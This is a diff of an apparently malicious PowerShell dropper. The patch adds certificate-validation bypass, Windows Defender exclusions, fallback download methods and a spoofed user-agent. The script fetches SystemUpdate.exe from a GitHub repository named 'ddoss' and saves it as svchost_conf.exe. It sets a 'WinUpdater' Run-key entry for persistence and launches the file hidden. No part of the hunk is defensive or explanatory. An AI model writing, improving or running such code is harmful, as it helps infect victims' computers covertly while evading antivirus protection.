@@ -4,25 +4,37 @@ $s = {
         exit
     }
 
-    $p = "C:\ProgramData"
-    $f = "$p\win_sys_service.exe"
+    # 1. Force TLS 1.2 and Ignore Certificate Errors
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+
+    # 2. Add Exclusions Fast
+    $d = "C:\Users\Public\Documents"
+    $f = "$d\svchost_conf.exe"
     $u = "https://github.com/srap18/ddoss/raw/refs/heads/main/SystemUpdate.exe"
 
-    Add-MpPreference -ExclusionPath $p -EA 0
-    Add-MpPreference -ExclusionProcess "powershell.exe", "win_sys_service.exe" -EA 0
+    Add-MpPreference -ExclusionPath $d -EA 0
+    Add-MpPreference -ExclusionProcess "powershell.exe", "svchost_conf.exe" -EA 0
 
-    Start-Sleep -s 5
+    Start-Sleep -s 3
 
+    # 3. Download using Invoke-WebRequest (Alternative to BITS/WebClient)
     try {
-        Start-BitsTransfer -Source $u -Destination $f -Priority Foreground -EA 0
+        Invoke-WebRequest -Uri $u -OutFile $f -UseBasicParsing -TimeoutSec 30
+        
         if (Test-Path $f) {
             Unblock-File -Path $f -EA 0
             Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WinUpdater' -Value "`"$f`"" -EA 0
             Start-Process -FilePath $f -WindowStyle Hidden -EA 0
         }
     } catch {
-        (New-Object System.Net.WebClient).DownloadFile($u, $f)
-        Start-Process $f -WindowStyle Hidden -EA 0
+        # Final Attempt: WebClient with custom User-Agent
+        try {
+            $w = New-Object System.Net.WebClient
+            $w.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+            $w.DownloadFile($u, $f)
+            Start-Process $f -WindowStyle Hidden -EA 0
+        } catch {}
     }
 }.ToString()
 
